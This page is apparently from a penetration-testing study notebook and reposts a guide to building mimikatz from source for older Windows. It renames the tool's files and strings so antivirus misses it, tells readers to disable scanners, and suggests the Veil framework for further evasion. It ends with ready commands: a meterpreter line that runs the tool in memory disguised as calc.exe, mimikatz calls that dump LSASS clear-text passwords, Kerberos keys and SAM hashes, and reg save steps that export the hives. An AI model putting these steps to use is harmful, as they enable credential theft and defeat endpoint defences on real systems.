---
description: '(https://aboureada.com/oscp/2017/12/02/jolly_frog.html)'
---

# Building MIMIKATZ for older versions of Windows

> I had compiled mimikatz from source, and I wondered if that might have broken something. So I fired up a Windows XP SP0 machine and tried the pre-compiled mimikatz version from the inter-webs. Sure thing, the program worked flawlessly. I then ran my compiled version - which I thought should be identical - and when executing mimikatz I got an error screen on the desktop stating a "DecodePointer" function in Kernel32.dll couldn't be found. I did some research on this error and learnt that the DecodePointer function was only added to kernel32.dll after Windows SP2: Mystery solved! I added the DecodePointer function to the solution, built it, fired up mimikatz on my Windows XP SP0 machine it worked.  
>   
> A minor inconvenience was that my antivirus would pick up Mimikatz as malware and delete the file. I proceeded to change the mimikatz code very slightly and I've come up with a version that my antivirus doesn't detect \(yet\) as a virus. I've attached the complete procedure below in case someone wants to compile Mimikatz from source and runs into the same issue:
>
> _Author: JollyFrogs, Brisbane_

{% hint style="danger" %}
Disable all virus-scanners before you start downloading, keep them disabled until your files are compiled
{% endhint %}

### Get the required programs and files:

1. **Download:** 
   1. \*\*\*\*[https://github.com/gentilkiwi/mimikatz/archive/master.zip](https://github.com/gentilkiwi/mimikatz/archive/master.zip) \(Free\)
   2. [GRMWDK\_EN\_7600\_1.ISO](https://download.microsoft.com/download/4/A/2/4A25C7D5-EFBE-4182-B6A9-AE6850409A78/GRMWDK_EN_7600_1.ISO) from Microsoft \(Free\)
   3. vs2013.4\_ce\_enu.iso from Microsoft \(Free\)
   4. fnr.exe from [https://findandreplace.codeplex.com/downloads/get/809617](https://findandreplace.codeplex.com/downloads/get/809617)
   5. [http://mulder.googlecode.com/svn/trunk/Utils/EncodePointerLib/Release/EncodePointer.lib](http://mulder.googlecode.com/svn/trunk/Utils/EncodePointerLib/Release/EncodePointer.lib)
2. **Install Driver Development Toolkit:**
   1. Extract GRMWDK\_EN\_7600\_1.ISO with 7-zip
   2. Run KitSetup.exe - Click Yes to start the installation - Tick "Full Development Environment" and leave all other options unticked - Click "OK" in the bottom right - Install path: C:\WinDDK\7600.16385.1\ - Click "OK" in the bottom right - Tick "I Agree" in the bottom left and click "OK" NOTE: The installation commences - Click "Finish" in the "Microsoft WDK Install Progress" screen
3. **Install Visual Studio 2013 Community Edition:**
   1. Extract vs2013.4\_ce\_enu.iso with 7-zip
   2. Run vs\_community.exe - Click "Continue" if you get a setup warning - Install path: C:\Program Files \(x86\)\Microsoft Visual Studio 12.0\ - Tick "I agree to the License Terms and Privacy Policy." - Untick "Join the Visual Studio Experience Improvement Program" - Click "Next" - Tick and then untick "Select All" to select nothing - Click "INSTALL" - Click "Yes" to close the UAC warning screen NOTE: the installation commences - Click "LAUNCH" after install completes - Click "Not now, maybe later." in the Welcome screen - Select "General" and Select "Blue" and Click "Start Visual Studio"
4. **Prevent AV detection on Mimikatz:**
   1. Extract mimikatz-master.zip to C:\jollykatz\ \(you should end up with C:\jollykatz\mimikatz-master\mimikatz.sln" and a whole bunch of files/folders\)
5. **Run the following in a cmd.exe to rename all files and folders to from "mimi" to "jolly":**
   1. powershell.exe -noprofile -command "1..10 \| % {Get-ChildItem c:\jollykatz\ -Filter \"\*mimi\*\" -Recurse \| Rename-Item -NewName {$\_.name -replace 'mimi','jolly' }}"
   2. powershell.exe -noprofile -command "1..10 \| % {Get-ChildItem c:\jollykatz\ -Filter \"\*kuhl\*\" -Recurse \| Rename-Item -NewName {$\_.name -replace 'kuhl','frog' }}"
6. **Run fnr.exe with following settings:** Dir: C:\jollykatz\ Tick "Include sub-directories File Mask: \*.\* Find: mimi replace: jolly Click "replace"
7. **Run fnr.exe with following settings:** Dir: C:\jollykatz\ Tick "Include sub-directories File Mask: \*.\* Find: kuhl replace: frog Click "replace"
8. run fnr.exe with following settings: Dir: C:\jollykatz\ Tick "Include sub-directories File Mask: \*.\* Find: eo.oe.kiwi replace: THINC.local Click "replace" Close fnr.exe
9. Copy "EncodePointer.lib" to C:\jollykatz\jollykatz-master\lib\Win32
10. Copy "EncodePointer.lib" to C:\jollykatz\jollykatz-master\lib\x64 NOTE: We're adding "EncodePointer.lib" because WinXP SP0/SP1 would error out with a DecodePointer error caused by compiling with VS2013 
11. Now we'll build "Jollykatz":

- Double-click on "C:\jollykatz\jollykatz-master\jollykatz.sln"  
NOTE: Visual Studio Community Edition opens your project  
  
  
- In the "Solution Explorer" window on the right, expand "global files" -&gt; "lib" -&gt; right-click on "Win32" and select "Add" -&gt; "Existing Item"  
- Choose "C:\jollykatz\jollykatz-master\lib\Win32\EncodePointer.lib"  
- In the "Solution Explorer" window on the right, expand "global files" -&gt; "lib" -&gt; right-click on "x64" and select "Add" -&gt; "Existing Item"  
- Choose "C:\jollykatz\jollykatz-master\lib\x64\EncodePointer.lib"  
  
  
- In the "Solution Explorer" window on the right, right-click on "jollykatz" \(might have to scroll to bottom\) and select "Properties"  
- Expand "Configuration Properties" -&gt; "General" -&gt; Set "Use of MFC" to "Use Standard Windows Libraries"  
- Click "Apply" in the bottom  
- Expand "Configuration Properties" -&gt; "C/C++" -&gt; "Code Generation" -&gt; Set "Runtime Library" to "Multi-threaded \(/MT\)"  
- Click "Apply" in the bottom  
- Expand "Configuration Properties" -&gt; "Linker" -&gt; "Input" -&gt; Add "EncodePointer.lib;" at the start of "Additional Dependencies" \(in front of "advapi32.lib"\)  
- Click "OK" in the bottom  
  
  
- In the top menu bar, click "Build" -&gt; "Rebuild Solution"  
NOTE: You should see "Rebuild All: 3 succeeded, 0 failed, 0 up-to-date, 0 skipped"  
NOTE: This means that the 32-bit build succeeded!  
  
  
- In the top bar, next to "Release", change "Win32" to "x64"  
- In the top menu bar, click "Build" -&gt; "Rebuild Solution"  
NOTE: You should see "Rebuild All: 3 succeeded, 0 failed, 0 up-to-date, 0 skipped"  
NOTE: This means that the 64-bit build succeeded!  
  
  
NOTE: You should now see 5 files in the C:\jollykatz\jollykatz-master\Win32\ directory, of which you will need 3:  
- jollykatz.exe  
- jollylib.dll  
- jollydrv.sys  
NOTE: You should see the same file structure in the C:\jollykatz\jollykatz-master\x64\ directory  
  
  
Copy and rename C:\jollykatz\jollykatz-master\Win32\jollykatz.exe to C:\jollykatz\jollykatz32.exe  
Copy and rename C:\jollykatz\jollykatz-master\x64\jollykatz.exe to C:\jollykatz\jollykatz64.exe  
NOTE: Typically, you only need jollykatz.exe, the driver \(jollydrv.sys\) and library \(jollylib.dll\) files are optional. If you need the drivers, copy and rename them as well.  
  
  
NOTE: Hopefully, your antivirus won't pick up on the new jollykatz.exe files. If it does, you'll need to modify some code. Or use the Veil framework.  
  
  
Run Mimikatz from memory through meterpreter \(advisable\):

execute -H -i -c -m -d calc.exe -f jollykatz.exe -a '"privilege::debug" "sekurlsa::logonPasswords full" "exit"'  
  
  
How to use:

  
  
-- \*\*\*\* clear-text passwords from LSASS process:  
C:\&gt; jollykatz32.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit"  
  
  
-- Steal users credentials until they reset their passwords:  
C:\&gt; jollykatz32.exe "privilege::debug" "sekurlsa::ekeys" "exit"  
  
  
-- \*\*\*\* LM and NTLM hashes from SAM:  
C:\&gt; jollykatz32.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"  
  
  
-- read SAM file from /repair or ntbackup files:  
C:\&gt; reg save HKLM\SYSTEM SystemBkup.hiv  
C:\&gt; reg save HKLM\SAM SamBkup.hiv  
\(Or use Volume Shadow Copy / BootCD to backup these files or get them from the repair folder:\)  
C:\Windows\System32\config\SYSTEM  
C:\Windows\System32\config\SAM  
C:\&gt; jollykatz32.exe "lsadump::sam SystemBkup.hiv SamBkup.hiv" "exit"

